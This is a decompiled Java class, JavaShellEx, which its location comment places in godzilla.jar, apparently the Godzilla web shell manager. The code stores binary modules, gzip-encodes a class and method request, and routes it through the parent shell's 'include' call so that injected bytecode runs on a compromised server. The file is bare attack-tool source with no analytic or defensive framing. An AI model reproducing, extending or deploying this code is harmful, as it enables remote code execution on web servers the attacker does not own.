/*    */ package shells.payloads.java;
/*    */ 
/*    */ import java.util.HashMap;
/*    */ import util.functions;
/*    */ import util.http.ReqParameter;
/*    */ 
/*    */ 
/*    */ public class JavaShellEx
/*    */   extends JavaShell
/*    */ {
/* 11 */   private final HashMap<String, byte[]> moduleMap = (HashMap)new HashMap<>();
/*    */   
/*    */   public boolean include(String codeName, byte[] binCode) {
/* 14 */     this.moduleMap.put(codeName, binCode);
/* 15 */     return true;
/*    */   }
/*    */   
/*    */   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
/* 19 */     if (className != null && className.trim().length() > 0) {
/* 20 */       if (this.moduleMap.get(className) != null) {
/* 21 */         ReqParameter evalNextData = new ReqParameter();
/* 22 */         evalNextData.add("codeName", className);
/* 23 */         evalNextData.add("binCode", this.moduleMap.get(className));
/*    */         
/* 25 */         parameter.add("evalClassName", className);
/* 26 */         parameter.add("methodName", funcName);
/*    */         
/* 28 */         evalNextData.add("evalNextData", functions.gzipE(parameter.formatEx()));
/*    */         
/* 30 */         return super.evalFunc(null, "include", evalNextData);
/*    */       } 
/*    */       
/* 33 */       return "no include".getBytes();
/*    */     } 
/*    */     
/* 36 */     return super.evalFunc(className, funcName, parameter);
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\java\JavaShellEx.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */